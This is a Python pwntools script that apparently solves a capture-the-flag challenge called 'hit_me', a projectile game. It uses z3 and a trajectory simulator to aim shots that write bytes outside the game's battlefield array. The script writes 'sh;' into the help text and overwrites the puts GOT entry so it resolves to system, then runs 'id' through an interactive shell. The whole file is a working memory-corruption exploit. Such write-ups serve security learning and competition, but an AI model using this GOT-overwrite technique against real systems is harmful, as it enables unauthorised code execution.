from pwn import *
import z3

WIDTH = 64
HEIGHT = 16

start_y = HEIGHT // 2
G_2 = 9.81 / 2.0
TSCALE = 0.005

def sim(vel_x, vel_y, tar_x, tar_y, ti=None):
    dbg_ti = ti
    hits = set()
    for ti in range(9999999999):
        t = ti * TSCALE
        x = int(vel_x * t)
        y = start_y + int(vel_y * t - G_2 * t * t)
        if dbg_ti in [ti-2, ti-1, ti, ti+1, ti+2]:
            print(f"{ti = :#x} {t = } {x = } {y = }")
        if x < WIDTH and y < HEIGHT:
            if x < 0 or y < 0:
                hits.add(y*WIDTH+x)
        if x > tar_x or y < tar_y:
            break
        if x == tar_x and y == tar_y:
            break
    return hits

p = process(sys.argv[1:])

def fire(target, target_char):
    target_x = -1
    target_y = -1
    while target_x < 60 or target_y < start_y:
        if target_x != -1:
            # print("redo")
            p.sendline(b"X")
            p.sendline(b"X 1")
            p.sendline(b"Y 1")
            p.sendline(b"Fire!!")
        p.recvuntil(b"Your target is at ")
        target_x = int(p.recvuntil(b",", drop=True).decode())
        target_y = int(p.recvline().decode().strip())

    print(f"{target_x = }")
    print(f"{target_y = }")

    s = z3.Solver()
    vel_y = z3.Real("vel_y")
    s.add(vel_y > 0)
    ti = z3.Int("ti")
    t = z3.ToReal(ti) * TSCALE
    t_ = z3.ToReal(ti+1) * TSCALE
    s.add(ti > 0)
    s.add(start_y + vel_y*t - G_2*t*t > target_y)
    s.add(start_y + vel_y*t_ - G_2*t_*t_ < target // WIDTH)
    s.add(start_y + vel_y*t_ - G_2*t_*t_ > (target // WIDTH)-1)

    assert s.check() == z3.sat
    print(s.model())
    ti = s.model()[ti].as_long()
    vel_y = float(s.model()[vel_y].as_decimal(16)[:-1])

    t = ti*TSCALE
    print(f"{ti = }")
    print(f"{t = }")
    print(f"{vel_y = }")
    def search():
        pr = log.progress(f"searching for {target}")
        for vel_x in range(0, WIDTH):
            vel_x /= TSCALE
            vel_x /= ti
            vel_x += 0.0000000000001
            for vel_y_ in [vel_y-0.000001, vel_y, vel_y+0.000001]:
                res = sim(vel_x, vel_y, target_x, target_y)
                pr.status(f"{res}")
                if target in res:
                    pr.success(f"{vel_x=} {vel_y=}")
                    return (vel_x, vel_y)
        assert False, "not found"

    print(f"{target_char = :#x}")
    p.sendline(bytes([target_char]))
    vel_x, vel_y = search()
    p.sendlineafter(b"]>", f"X {vel_x}".encode())
    p.sendlineafter(b"]>", f"Y {vel_y}".encode())
    p.sendline(b"Fire!!")


e = ELF("./hit_me")
battlefield = e.symbols["battlefield"]

target = e.symbols["help_text"] - battlefield
for i, c in enumerate(b"sh;"):
    fire(target+i, c)

target = e.got["puts"] - battlefield
target_char = (e.plt["system"] & 0xff) + 6
fire(target, target_char)

p.sendline(b"\x01")
p.recvuntil(b"Excellent choice")
p.sendline(b"help")
p.sendline(b"id")
p.interactive()
